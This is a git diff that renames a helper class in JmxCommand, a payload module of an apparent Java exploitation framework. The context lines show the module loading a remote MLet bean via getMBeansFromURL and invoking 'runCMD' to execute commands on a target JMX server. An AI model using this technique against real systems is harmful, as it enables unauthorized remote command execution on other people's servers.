@@ -1,6 +1,6 @@
 package com.lucifaer.jokerframework.modules.payloads;
 
-import com.lucifaer.jokerframework.core.shell.config.ShellHelper;
+import com.lucifaer.jokerframework.core.shell.config.JokerShellHelper;
 import com.lucifaer.jokerframework.modules.Payload;
 import com.lucifaer.jokerframework.plugins.Client;
 import com.lucifaer.jokerframework.plugins.Server;
@@ -23,7 +23,7 @@ public class JmxCommand implements Payload {
     private Server server;
 
     @Autowired
-    ShellHelper shellHelper;
+    JokerShellHelper jokerShellHelper;
 
     private MBeanServerConnection mbsc;
     private ObjectInstance mletBean;
@@ -34,12 +34,12 @@ public class JmxCommand implements Payload {
         this.mbsc = (MBeanServerConnection) client.init();
         try {
             getMletBean();
-            shellHelper.echoInfo("Loading " + this.mletBean.getClassName());
-            shellHelper.echoInfo("Executing command: " + params.get("command"));
+            jokerShellHelper.echoInfo("Loading " + this.mletBean.getClassName());
+            jokerShellHelper.echoInfo("Executing command: " + params.get("command"));
             String[] mletParams = {params.get("command")};
             String[] mletSigneture = {"java.lang.String"};
             String reader = (String) this.mbsc.invoke(this.mletBean.getObjectName(), "runCMD", mletParams, mletSigneture);
-            shellHelper.echoSuccess(reader);
+            jokerShellHelper.echoSuccess(reader);
         } catch (Exception e) {
             e.printStackTrace();
         }
@@ -78,13 +78,13 @@ public class JmxCommand implements Payload {
         Set mbeanSet = (Set) this.mbsc.invoke(this.mletBean.getObjectName(), "getMBeansFromURL", mletParams, mletSigneture);
         for (Object element : mbeanSet) {
             if (element instanceof ObjectInstance) {
-                shellHelper.echoInfo("Object name = " + ((ObjectInstance)element).getObjectName());
+                jokerShellHelper.echoInfo("Object name = " + ((ObjectInstance)element).getObjectName());
             }
             else {
-                shellHelper.echoError("Exception = " + ((Throwable)element).getMessage());
-                shellHelper.echoError("Install Fail");
+                jokerShellHelper.echoError("Exception = " + ((Throwable)element).getMessage());
+                jokerShellHelper.echoError("Install Fail");
             }
         }
-        shellHelper.echoSuccess("Install Successful");
+        jokerShellHelper.echoSuccess("Install Successful");
     }
 }
